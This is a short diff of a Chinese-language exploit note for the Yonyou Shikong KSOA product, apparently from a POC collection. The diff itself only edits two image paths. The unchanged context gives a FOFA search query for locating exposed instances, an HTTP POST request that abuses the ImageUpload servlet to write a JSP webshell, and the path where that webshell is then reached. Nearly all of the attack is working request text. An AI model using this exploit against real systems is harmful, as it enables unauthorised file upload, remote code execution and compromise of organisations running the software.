@@ -1,6 +1,6 @@
 ## 资产收集：
 fofa：app="用友-时空KSOA"
-![](/img/ksoa.png)
+![](img/ksoa.png)
 ## 利用方法：
 ```
 POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=poc.jsp HTTP/1.1
@@ -15,4 +15,4 @@ Connection: close
 webshell
 ```
 webshell链接地址：`x.x.x.x/pictures/poc.jsp`
-![](/img/ksoa_poc.png)
+![](img/ksoa_poc.png)
